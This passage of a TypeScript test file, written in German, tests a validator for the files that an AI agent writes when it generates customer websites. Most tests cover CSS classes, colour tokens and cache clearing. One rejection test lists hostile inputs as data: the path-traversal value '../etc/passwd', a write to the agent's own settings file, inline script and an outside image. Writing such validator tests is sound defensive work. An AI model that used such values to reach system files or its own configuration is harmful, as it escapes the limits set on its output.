  function siteMitCss(css: string): string {
    const dir = mkdtempSync(join(tmpdir(), "regoro-validate-site-"));
    tmpRoots.push(dir);
    // .wrap gehört zum Gerüst von `seite()` — ohne es meldete jede Prüfung hier
    // zusätzlich diese Klasse und verdeckte, worum es im Test geht.
    writeFileSync(join(dir, "styles.css"), `.wrap{margin:0}\n${css}`);
    mkdirSync(join(dir, "assets"), { recursive: true });
    return dir;
  }

  /** Wird GENAU diese Klasse bemängelt? Die Hinweise listen zusätzlich die vorhandenen auf. */
  function meldetKlasse(hinweise: string[], klasse: string): boolean {
    return hinweise.some((h) => h.includes(`"${klasse}"`));
  }

  function pruefeBei(siteDir: string, inhalt: string): ValidateErgebnis {
    return validateAgentOutput("x.html", inhalt, null, { siteDir, browserHerkuenfte: [], anzahlBisher: 0 });
  }

  test("eine Klasse, die nur Kunde A kennt, bleibt bei Kunde B ein Hinweis", () => {
    const a = siteMitCss(".sonderknopf{color:#123456}");
    const b = siteMitCss(".etwasanderes{color:#123456}");
    const inhalt = seite('<a class="sonderknopf">L</a>');

    const beiA = pruefeBei(a, inhalt);
    const beiB = pruefeBei(b, inhalt);

    expect(beiA.ok).toBe(true);
    expect(beiB.ok).toBe(true);
    if (beiA.ok) expect(meldetKlasse(beiA.hinweise, "sonderknopf")).toBe(false);
    if (beiB.ok) expect(meldetKlasse(beiB.hinweise, "sonderknopf")).toBe(true);
  });

  test("eine Farbe, die nur Kunde A als Token führt, bleibt bei Kunde B ein Hinweis", () => {
    const a = siteMitCss(":root{--ton:#abcdef}");
    const b = siteMitCss(":root{--ton:#123456}");
    const inhalt = seite('<p style="color:#abcdef">x</p>');
    const beiA = pruefeBei(a, inhalt);
    const beiB = pruefeBei(b, inhalt);
    if (beiA.ok) expect(beiA.hinweise.some((h) => h.includes("#abcdef"))).toBe(false);
    if (beiB.ok) expect(beiB.hinweise.some((h) => h.includes("#abcdef"))).toBe(true);
  });

  test("leereSiteWissenCache() macht geändertes CSS wieder sichtbar", () => {
    // Ein Lauf legt assets/neu.css mit .frischeklasse an. Ohne das Verwerfen
    // meldete der nächste Lauf dieselbe Klasse weiter als „gibt es nicht" —
    // und der Agent baute sie gehorsam wieder aus.
    const dir = siteMitCss(".nurdiese{color:red}");
    const inhalt = seite('<div class="frischeklasse">x</div>');

    const vorher = pruefeBei(dir, inhalt);
    if (vorher.ok) expect(meldetKlasse(vorher.hinweise, "frischeklasse")).toBe(true);

    writeFileSync(join(dir, "styles.css"), ".wrap{margin:0}\n.frischeklasse{color:red}");
    leereSiteWissenCache();

    const nachher = pruefeBei(dir, inhalt);
    expect(nachher.ok).toBe(true);
    if (nachher.ok) expect(meldetKlasse(nachher.hinweise, "frischeklasse")).toBe(false);
  });

  test("ein nicht vorhandener Site-Ordner liefert Hinweise, aber keinen Absturz", () => {
    expect(pruefeBei("/gibt/es/nicht", seite('<div class="irgendwas">x</div>')).ok).toBe(true);
  });
});

// ===========================================================================
// Die Form der Antwort
// ===========================================================================

describe("validate.ts — die Ablehnung geht als Text an den Agenten zurück", () => {
  test("jeder Ablehnungsgrund ist ein nicht leerer Satz", () => {
    for (const [pfad, inhalt] of [
      [".pi/settings.json", "{}"],
      ["../etc/passwd", "x"],
      ["daten.json", "{}"],
      ["Foo Bar.html", "<p>x</p>"],
      ["gross.txt", "a".repeat(MAX_DATEI_BYTES + 1)],
      ["index.html", seite("<script>a()</script>")],
      ["index.html", seite('<img src="//fremd.de/x.png" alt="">')],
    ] as const) {
      const e = pruefe(pfad, inhalt);
      expect(e.ok).toBe(false);
      if (!e.ok) {
        expect(e.grund.trim().length).toBeGreaterThan(10);
        expect(e.grund.length).toBeLessThan(500);
      }
    }
  });

  test("der Grund enthält nicht den ganzen Dateiinhalt", () => {
    const inhalt = seite(`<script>${"x".repeat(2000)}</script>`);
    const e = pruefe("index.html", inhalt);
    expect(e.ok).toBe(false);
    if (!e.ok) expect(e.grund).not.toContain("x".repeat(200));
  });

  test("eine Annahme liefert immer ein Array, nie undefined", () => {
    const e = pruefe("leistungen.html", seite("<p>x</p>"));
    expect(e.ok).toBe(true);
    if (e.ok) expect(Array.isArray(e.hinweise)).toBe(true);
  });

  test("der Validator wirft nie — er antwortet", () => {
    // Er läuft mitten in einem Lauf; ein Wurf risse den ganzen Lauf mit,
    // statt dem Agenten eine Runde zum Nachbessern zu geben.
    expect(() => pruefe("index.html", "<<<>>>nicht wirklich html<")).not.toThrow();
    expect(() => pruefe("index.html", " ")).not.toThrow();
    expect(() => validateAgentOutput("index.html", "<p>x</p>", null, ktx({ siteDir: "/gibt/es/nicht" }))).not.toThrow();
  });
});
